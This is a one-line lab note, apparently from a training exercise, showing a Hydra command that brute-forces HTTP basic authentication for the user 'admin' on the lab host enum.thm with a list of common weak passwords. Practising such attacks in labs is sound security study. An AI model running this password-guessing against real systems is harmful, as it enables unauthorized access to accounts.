# Basic Authentication with Hydra

```shell
hydra -l admin -P 500-worst-passwords.txt -s 80 -vV enum.thm http-get /labs/basic_auth/
```
